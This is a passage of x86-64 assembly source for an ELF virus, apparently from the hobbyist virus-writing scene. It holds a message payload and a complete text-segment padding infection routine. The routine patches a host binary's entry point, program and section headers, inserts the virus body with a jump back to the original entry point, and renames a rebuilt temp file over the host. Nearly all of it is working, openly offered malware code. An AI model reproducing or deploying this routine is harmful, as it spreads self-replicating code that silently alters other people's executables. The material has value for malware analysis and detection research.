		db 0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x3e,0x3e,0x3c,0xa,0x3e,0x25,0x25,0x3e,0x6f,0x27,0x27,0x27,0x6f,0x21,0x21,0x6f,0x27,0x44,0x27,0x3e,0x3c,0x78,0x3c,0x3e,0x3e,0x27
		db 0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x3e,0x3e,0x3e,0x3c,0x3c,0xa,0x3e,0x3e,0x3e,0x3e,0x21,0x21,0x3c,0x27,0x21,0x21,0x21,0x6f,0x27,0x6f,0x21,0x27,0x21,0x21,0x3c,0x3c,0x3c
		db 0x3e,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3c,0x3c,0x3c,0xa,0x3e,0x3e,0x3c,0x21,0x6f,0x6f,0x6f,0x27,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x25,0x25
		db 0x25,0x3e,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x25,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3c,0x3c,0x3c,0x3c,0x27,0xa,0x3c,0x3c,0x27,0x6f,0x78,0x6f,0x6f,0x27,0x3c,0x3c,0x3c,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e,0x3e		
		db 0x77,0x20,0x3C,0x33,0x20,0x74,0x6D,0x70,0x2E,0x30,0x75,0x74,0x20,0x76,0x6F,0x6C,0x20,0x33,0x2C,0x20,0x78,0x6F,0x78,0x6F,0x20,0x69,0x63,0x33,0x71,0x75,0x33,0x33,0x6E
		payload_len equ $-painting

payload:
	pop rsi
	mov rdx, payload_len
	mov rax, 0x1 			;SYS_WRITE
	mov rdi, 0x1 ;STDOUT
	syscall
	jmp _restore
;*******************************************************************************
;	Text segment padding virus, infection routine:
;       
;	Assumes the following:
;	vlen == length of virus code
;	PAGESIZE == 4096
;
;   1. Find and save original entry point (OEP) of ELF host 
;   2. Patch ELF header values to account for newly inserted virus code
;		a. Patch e_entry in the ELF header to point to beginning of virus code
;      	b. change e_shoff in virus ELF header to new_vx_e_shoff 
;			s.t. new_vx_e_shoff = host_e_shoff + PAGESIZE
;   3. a. Loop through all Phdrs to find text segment Phdr
;      b. if curr_Phdr == text_segment_Phdr then, do the following:
;           i. increase p_filesz by vlen [p_filesz += vlen] 
;           ii. increase p_memsz by vlen, [p_memsz += vlen]
;      c. Else, for all Phdrs corresponding to segments located after inserted
;		   virus code (aka for each Phdr of a segment after the text segment),
;		   then, do the following:
;           i. increase p_offset by PAGESIZE
;   4. Loop through all Shdrs
;      a. If curr_shdr == last_shdr_text_segment then,
;           i. increase sh_len by vlen [sh_len += vlen]
;      b. Else, for all Shdrs corresponding to sections located after inserted 
;		  virus code (aka for each Shdr of a section after virus code), 
;		  then, do the following:
;           i. increase sh_offset by PAGESIZE [sh_offset += PAGESIZE]
;   5. Insert the virus code into the host program 
;		a. In our case, insert the virus code into the tempfile we are 
;			constructing to replace host ELF
;		b. Add routine to end of virus code so that execution continues with
;			 jump back to saved OEP
;*******************************************************************************

infect:
	mov r13, [r14 + 800]	;location on stack for saved address of 
							;mmap'd host ELF returned from mmap syscall
	mov r12, [r13 + 32]		;offset of host ELF Program Header Table in r12
	mov r15, [r13 + 40] 	;offset of host ELF Section Header Table in r15
	mov r8, [r13 + 24] 		;offset of host ELF entry point in r8

	mov dword [r13 + 9], 0x786f786f		
	;infection marker string "xoxo" in elf_ehdr.e_padding
	
;*******************************************************************************
;Patch Program Headers of infected ELF
;
;e_phentsize == size of program header entry	
;size of program header table == e_phnum * e_phentsize
;vx_offset = the offset to start of vx code after insertion into host 
;vx_offset will replace e_entry in ELF header, 
;defining the entry point in the infected ELF
;
;r13 contains address of mmap'ed host ELF
;mov r13, [r14 + 800]	
;location on stack for saved address returned from mmap syscall
;r12 contains *offset* within mmap'ed file to PHdr table
;mov r12, [r13 + 32]	 ;offset of host ELF Program Header Table
;we need to increment r12 on each iteration 
;(where # of iterations == elf_ehdr.e_phnum)
;
;we also need to save original entry point of the host ELF for  
;the final jmp at the end of our vx code
;
;We can use our schema from our stack layout for computing offsets 
;to diff SHdr fields as we iterate through all SHdrs:
;For reference, the PHdr patching routine accesses the fields in each entry 
;of the PHdr table using the following schema:
;[r14 + 800] + elf_ehdr.e_phoff + phdr_field_offset
;We can simplify it thus:
;
; r13 + r12 + 0		struc elf_phdr
; r13 + r12 + 0				.p_type		resd 1	;  uint32_t   
; r13 + r12 + 4				.p_flags		resd 1	;  uint32_t   
; r13 + r12 + 8				.p_offset		resq 1	;  Elf64_Off  
; r13 + r12 + 16			.p_vaddr		resq 1	;  Elf64_Addr 
; r13 + r12 + 24			.p_paddr		resq 1	;  Elf64_Addr 
; r13 + r12 + 32			.p_filesz		resq 1	;  uint64_t   
; r13 + r12 + 40			.p_memsz		resq 1	;  uint64_t   
; r13 + r12 + 48			.p_align		resq 1	;  uint64_t   
; r13 + r12 + 56		endstruc
;
;PT_LOAD 	equ 0x1
;PFLAGS_RX	equ 0x5
;PFLAGS_RW	equ 0x6
;*******************************************************************************
;***************************************************************
	xor rcx, rcx
	xor r11, r11
	mov word cx, [r13 + 56]			;elf_ehdr.e_phnum
	check_phdrs:
		.phdr_loop:
			push rcx
			;check elf_phdr.p_type offset == type PT_LOAD	
			cmp word [r13 + r12], 0x1			
			jne .mod_subsequent_phdr
			.mod_curr_header:
					;check elf_phdr.p_flags == PFLAG_R | PFLAG_X			
				cmp dword [r13 + r12 + 4], 0x5	
				je .mod_phdr_text_segment			
				jmp .mod_subsequent_phdr

				.mod_phdr_text_segment:			
				; entry virus addr (evaddr)= 
				; phdr->p_vaddr + phdr->p_filesz				
				; save evaddr to (r14 + 400)
				; load address of OEP from ELF header
				; new entry point of infected file = evaddr
				; patch ELF header entry point to start of vx code
				; vxoffset = elf_phdr.p_offset+elf_phdr.p_filesz
				; save vxoffset to stack
				; phdr.p_filesz += vlen+10(size of jmp to OEP)
				; phdr.p_memsz += vlen+10(size of jmp to OEP)
	
					mov r10, [r13 + r12 + 16] 	;elf_phdr.p_vaddr
					add r10, [r13 + r12 + 32]	;elf_phdr.p_filesz
					mov qword [r14 + 400], r10
					mov r11, qword [r13 + 24]	
					mov qword [r14 + 448], r11	;save OEP to stack
					
					mov qword [r13 + 24], r10

					mov r10, [r13 + r12 + 8]	;elf_phdr.p_offset  
					add r10, [r13 + r12 + 32]	;elf_phdr.p_filesz
					mov dword [r14 + 436], r10d

					add qword [r13 + r12 + 32], vlen+12
					add qword [r13 + r12 + 40], vlen+12	
					jmp .next_phdr				
		
			.mod_subsequent_phdr:
			; load variable from stack corresponding to 
			; offset of next segment after .text in host ELF
			; check if this variable has already been defined
			; in a previous loop iteration 
			; (check if next_segment_offset == 0)
			; otherwise, move offset of curr segment to that var
			; because based on checks up to this point, we know
			; that r11 contains offset of next segment after .text 
			; segment, in host ELF 
			;
				xor r11, r11
				mov r11d, [r14 + 436]
				cmp r11d, 0
				je .next_phdr
				mov r10, [r13 + r12 + 8]		;elf_phdr.p_offset  
				cmp r10, qword [r14 + 400]
				jl .next_phdr
				add dword r10d, [PAGESIZE]
				mov [r13 + r12 + 8], r10		;elf_phdr.p_offset
				xor r10, r10
				mov r10, qword [r14 + 424]
				cmp r10, 0
				jne .next_phdr
				mov qword [r14 + 424], r11
		.next_phdr:
			pop rcx
			dec cx 
			;add elf_ehdr.e_phentsize to phdr offset in r12
			add r12w, word [r13 + 54] 
			cmp cx, 0
			jg .phdr_loop
	mov dword [r14 + 432], r12d

;*******************************************************************************
;Now patch section headers of infected ELF:
;We will use a very similar schema as was used in the PHdr patching routine 
;above for our SHdr patching routine, with a few modifications.
;
;r13 contains address of mmap'ed host ELF
;mov r13, [r14 + 800]	
;location on stack for saved address returned from mmap syscall
;
;r15 contains *offset* within mmap'ed file to SHdr table
;mov r15, [r13 + 40] ;offset of host ELF Section Header Table
;
;we need to increment r15 on each iteration 
;(where # of iterations == elf_ehdr.e_shnum)
;At the 0th iteration, r15 contains the offset of the 0th Section Header 
;in the SHdr Table
;
;We can use our schema from our stack layout for computing offsets 
;to diff SHdr fields as we iterate through all SHdrs:
;[r14 + 800] + elf_ehdr.e_shoff + shdr_field_offset
;And simplify it thus:
;	r13 + r15 + 0		struc elf_shdr
;	r13 + r15 + 0			.sh_name		resd 1		;  uint32_t   
;	r13 + r15 + 4			.sh_type		resd 1		;  uint32_t   
;	r13 + r15 + 8			.sh_flags		resq 1		;  uint64_t   
;	r13 + r15 + 16			.sh_addr		resq 1		;  Elf64_Addr 
;	r13 + r15 + 24			.sh_offset		resq 1		;  Elf64_Off  
;	r13 + r15 + 32			.sh_size		resq 1		;  uint64_t   
;	r13 + r15 + 40    		.sh_link		resd 1		; uint32_t   
;	r13 + r15 + 44			.sh_info		resd 1		; uint32_t   
;	r13 + r15 + 48			.sh_addralign	resq 1		; uint64_t   
;	r13 + r15 + 56			.sh_entsize		resq 1		; uint64_t   
;	r13 + r15 + 64	endstruc
;
;*******************************************************************************
	xor r10, r10
	xor r11, r11
	xor rcx, rcx
	mov word cx, [r13 + 60]							; elf_ehdr.e_shnum
	check_shdrs:
		.shdr_loop:
			push rcx
			mov r11, [r13 + r15 + 24]				;elf_shdr.sh_offset
			cmp dword r11d, [r14 + 436]
			jge .mod_subsequent_shdr
			jl .check_for_last_text_shdr
			.check_for_last_text_shdr:
				mov r11, [r13 + r15 + 16]			;elf_shdr.sh_addr
				add r11, qword [r13 + r15 + 32]		;elf_shdr.sh_size
				cmp r11, qword [r14 + 400]
				jne .next_shdr
			.mod_last_text_section_shdr:
				mov r10, [r13 + r15 + 32]			;elf_shdr.sh_size
				add dword r10d, vlen
				mov [r13 + r15 + 32], r10			;elf_shdr.sh_size
				jmp .next_shdr
			.mod_subsequent_shdr:
				mov r11, [r13 + r15 + 24]			;elf_shdr.sh_offset
				add dword r11d, [PAGESIZE]
				mov dword [r13 + r15 + 24], r11d	;elf_shdr.sh_offset
		.next_shdr:
			pop rcx
			dec cx 
			add r15w, word [r13 + 58] 			;add elf_ehdr.e_shentsize 
												;to shdr offset in r15 
			cmp cx, 0
			jg .shdr_loop
	mov r11, [r13 + 40] 					;elf_ehdr.e_shoff
	mov qword [r14 + 408], r11				;original shoff
	.patch_ehdr_shoff:
		add dword r11d, [PAGESIZE]
		mov qword [r13 + 40], r11 			;elf_ehdr.e_shoff
		mov dword [r14 + 440], r11d
		jmp frankenstein_elf

;*******************************************************************************
;	From silvio's article [1], we know that an infected ELF will have 
;	the following layout:
;
;	ELF Header
;	Program Header Table
;	Segment 1
;		text
;		parasite
;
;	Segment 2
;	Section Header Table
;	Section 1
;	...
;	Section n
;
;	So this is the order in which we will construct (write to) our new complete
;	infected ELF -- currently a temp file, to be renamed to that of the host
;
;	Our plan for building this file will be to do the following:
;	create new temp file ".xo.tmp"
;	write modified elf header to .xo.tmp
;	write modified program headers to .xo.tmp
;	copy (write) host text segment from host ELF to .xo.tmp
;	write virus body to .xo.tmp
;	write patched jmp to original host entry point (push ret), after  vx body in .xo.tmp
;	write any padding bytes needed to maintain page alignment for temp file
;	write remaining segments [data segment to original Shdr offset] from host ELF to .xo.tmp
;	write modified section header table of mmap'ed host to .xo.tmp
;	copy (write) remaining bytes (end of SHdr table to EOF) from host ELF to .xo.tmp
;	rename .xo.tmp to original host file name
;	close temp file
;	unmap file from memory
;
;*******************************************************************************

frankenstein_elf:
	mov rax, 0x00706d742e6f782e		;temp filename = ".xo.tmp\0"
	mov [r14 + 0x800], rax
	lea rdi, [r14 + 0x800]			;name of file in rdi
	mov rsi, 0777o					;mode - 777 (file perms for new file)
	mov rax, 0x55 ;SYS_CREAT				;(O_CREAT | O_TRUNC | O_WRONLY)
	syscall
	
	mov r9, rax
	mov rdi, rax
	xor rdx, rdx
	
	;write ELF header to temp file

	cmp dword [r14 + 432], PAGESIZE
	jl .adjust_offset_ehdr_phdr_copy
	jmp .offset_ehdr_phdr_copy_pagesize
	.adjust_offset_ehdr_phdr_copy:
		add dword edx, [r14 + 436]
		jmp .write_host_ehdr_phdrs_textsegment
	.offset_ehdr_phdr_copy_pagesize:
		mov rdx, [PAGESIZE]
	.write_host_ehdr_phdrs_textsegment:	
		mov rdi, r9
		lea rsi, [r13]					;r13 contains pointer to mmap'd file
		mov rax, 0x1 					;SYS_WRITE
		syscall

	; pwrite64(int r14 + 416, const void* buf, size_t count, off_t offset)
	; rdi == r14 + 416
	; rsi == buf
	; rdx == count 
	; r10 == offset

	.write_virus_totemp:
		call .delta
		.delta:
			pop rax
			sub rax, .delta
		mov rdi, r9
		mov rdx, vlen
		lea rsi, [rax + vxstart]
		mov r10d, dword [r14 + 436]
		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
		syscall

; .write_jmp_to_oep writes the instruction to return to the OEP
; after execution of virus payload in an infected ELF
; it uses the technique from s01den's paper in tmp.0ut vol.1 "Return To Original Entry Point Despite PIE" 
; 
; huge shoutout to MalcolmVX for the feedback and guidance to 
; figure out the correct way to load the OEP into rax using a get_eip routine
;
;	rax = [rsp]
;	rax= [rsp - vlen - vxstart + OEP]
;
	.write_jmp_to_oep:
		xor r11, r11
		xor r10, r10
		mov r10, qword [r14 + 400] ;evaddr = $vxstart
		mov rdx, 30
		mov r11, qword [r14 + 448]
		mov byte [r14 + 150], 0xe8			;call get_rip
		mov dword [r14 + 151], 0x14			;at offset of 0x14 from curr instruction
		mov dword [r14 + 155], 0x2d48			;sub rax, vlen+5(length of get_rip instructions)
		mov dword [r14 + 157], vlen+5			
		mov dword [r14 + 161], 0x2d48			;sub rax, vxstart
		mov dword [r14 + 163], r10d			
		mov dword [r14 + 167], 0x0548			;add rax, OEP
		mov dword [r14 + 169], r11d			
		mov word [r14 + 173], 0xe0ff			;0xff 0xe0 = jump eax
		mov dword [r14 + 175], 0x24048b48		;mov rax, [rsp]; <- call get_rip
		mov byte [r14 + 179], 0xc3				;ret 
		lea rsi, [r14+ 150]
		mov r10d, dword [r14 + 436]
		add r10d, dword vlen				;file offset adjusted to r14 + 436+vlen
		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
		syscall

	;ftruncate syscall will grow the size of file (corresponding to file descriptor r14 + 416)
	; by n bytes, where n is a signed integer, passed in rsi
	;ftruncate grows the file with null bytes, so this will append nec. padding bytes
	;before we write the original host data segment to the temp file
	; ftruncate(int r14 + 416, offset_t length)
	; rdi == r14 + 416
	; rsi == length
	.write_padding_after_vx:
		xor r11, r11
		xor rsi, rsi
		mov r11d, dword [PAGESIZE]
		;;;add r10d, dword vlen				;file offset adjusted to r14 + 436+vlen
		add r10d, 6							;add 6 bytes for push/ret original entrypoint
		mov rsi, qword [r14 + 424]		;offset of next segment after .text in host ELF
		add esi, r11d 
		mov dword [r14 + 444], esi		;vx_padding_size (# padding bytes after vx)
		mov rax, 0x4d ;SYS_FTRUNCATE
		syscall
	.write_remainingsegments_totemp:
		xor r10, r10
		mov rdx, qword [r14 + 408]		; original shoff
		sub edx, dword [r14 + 424]		; offset of next segment after .text in host ELF
		lea rsi, [r13]					;r13 contains pointer to mmap'd file
		add rsi, qword [r14 + 424]		;adjust rsi address to point to PT_LOAD segment 
										;following .text segment in mmap'd original host file
		mov r10d, dword [r14 + 444]		;vx_padding_size (# of bytes of padding after vx)
		mov rax, 0x12					;SYS_PWRITE64 	equ 0x12
		syscall
	.write_patched_shdrs_totemp:
		mov rdx, [r14 + 48] 			;filestat.st_size
		sub rdx, qword [r14 + 408]		;original shoff
		lea rsi, [r13]
		add rsi, qword [r14 + 408]		;original shoff			
		mov r10d, dword [r14 + 440]		;vx SH offset
		mov rax, 0x12					;SYS_PWRITE64 	equ 0x12
		syscall
	.munmap_file_work_area:
		lea rdi, [r13]					;munmap file from work area
		mov rsi, [r14 + 48] 			;filestat.st_size
		mov rax, 0xB 					;SYS_MUNMAP
		syscall
	.close_temp:		
		mov rdi, r9						;close temp file
		mov rax, 0x3 					;SYS_CLOSE
		syscall
	.rename_temp_to_host:		
		lea rdi, [r14 + 0x800]			;name of temp file in rdi
		mov rsi, qword [r14 + 200]			;original name of host file in rsi
		mov rax, 0x52 					;SYS_RENAME
		syscall
fin_infect:
	ret
PAGESIZE: dd 4096	
get_rip:
	mov rax, [rsp]
	ret
;;restore stack to original state
_restore:
	add rsp, 0x2000
	mov rsp, rbp
	pop r15
	pop r14
	pop r13
	pop r12
	pop r11
	pop r10
	pop r9
	pop r8
	pop rdi
	pop rsi
	pop rdx
	pop rcx
	pop rbx
	pop rax
	pop rbp
	pop rsp

vend:
vlen equ vend - vxstart
_end:
	xor rdi, rdi
	mov rax, 0x3c 				;exit() syscall on x64: SYS_EXIT equ 0x3c
	syscall	
